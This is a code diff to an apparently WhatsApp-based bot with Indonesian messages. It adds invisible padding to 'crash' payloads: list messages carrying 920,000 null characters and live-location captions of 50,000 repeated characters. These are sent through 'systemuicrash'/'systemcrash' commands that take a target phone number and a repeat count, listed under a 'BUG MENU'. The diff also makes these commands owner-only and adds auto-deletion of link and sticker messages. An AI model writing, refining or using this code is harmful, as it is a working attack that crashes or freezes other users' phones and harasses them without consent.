@@ -7,6 +7,8 @@ const axios = require('axios')
 const chalk = require('chalk')
 const crypto = require('crypto')
 const moment = require('moment-timezone')
+const more = String.fromCharCode(8206)
+const readmore = more.repeat(4001)
 const { exec, spawn, execSync } = require("child_process")
 const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, sleep } = require('./Database/myfunction');
 
@@ -35,16 +37,65 @@ const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase(
 const args = body.trim().split(/ +/).slice(1)
 const text = q = args.join(" ")
 const quoted = m.quoted ? m.quoted : m
+const isSockMedia = m.mtype
 const isGroup = m.key.remoteJid.endsWith('@g.us')
 const botNumber = await sock.decodeJid(sock.user.id)
 const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 
+if (budy.match('https://')) {
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
+    }
+  })
+ }
+
+if(isSockMedia === "stickerMessage"){
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
+   }
+  )
+ }
+ 
+if (budy.match('vcs')) {
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
+    }
+  })
+ }
+ 
+if (budy.match('VCS')) {
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
+    }
+  })
+ } 
+
+if (budy.match('Vcs')) {
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
+    }
+  })
+ }
+
+if (budy.match('vCs')) {
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
+    }
+  })
+ }
+
+if (budy.match('vcS')) {
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
+    }
+  })
+ }
+
+if (budy.match('HTTPS://')) {
+await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant
+    }
+  })
+ }
+
 async function sendListMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'listMessage': {
-      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
-      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
-      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
+      'title': `${readmore}SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸` + "\0".repeat(920000),
+      'footerText': `${readmore}àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®`,
+      'description': `${readmore}àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®`,
       'buttonText': null,
       'listType': 2,
       'productListInfo': {
@@ -96,7 +147,7 @@ async function sendLiveLocationMessage(jid) {
         'liveLocationMessage': {
           'degreesLatitude': 'p',
           'degreesLongitude': 'p',
-          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
+          'caption': `${readmore}Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½` + 'ê¦¾'.repeat(50000),
           'sequenceNumber': '0',
           'jpegThumbnail': ''
         }
@@ -122,7 +173,7 @@ async function sendMixedMessages(jid, count) {
   }
 }
 
-function sendMessageWithMentions(text, mentions = [], quoted = false) {
+async function sendMessageWithMentions(text, mentions = [], quoted = false) {
   if (quoted == null || quoted == undefined || quoted == false) {
     return sock.sendMessage(m.chat, {
       'text': text,
@@ -142,7 +193,7 @@ function sendMessageWithMentions(text, mentions = [], quoted = false) {
 
 switch (command) { 
 case "systemuicrash": case "systemcrash": case"androidmatot": { 
-if (!isGroup) return m.reply('Fitur ini Khusus Group');
+if (!isCreator) return m.reply('Fitur ini Khusus Owner');
   if (!text) return m.reply(`Contoh dek:\n${prefix+command} 628×××,jumlah`);
   if (!text.split(" ")[0].includes("628")) {
       return m.reply(`Contoh dek:\n${prefix+command} 628×××,jumlah`);
@@ -187,7 +238,7 @@ if (!isGroup) return m.reply('Fitur ini Khusus Group');
  break;
  
 case "menu": case "allmenu": case "menuror": { 
-if (!isGroup) return
+if (!isCreator) return
 let menu = 
 `*[ BUG MENU ]*
 • systemuicrash 628×××
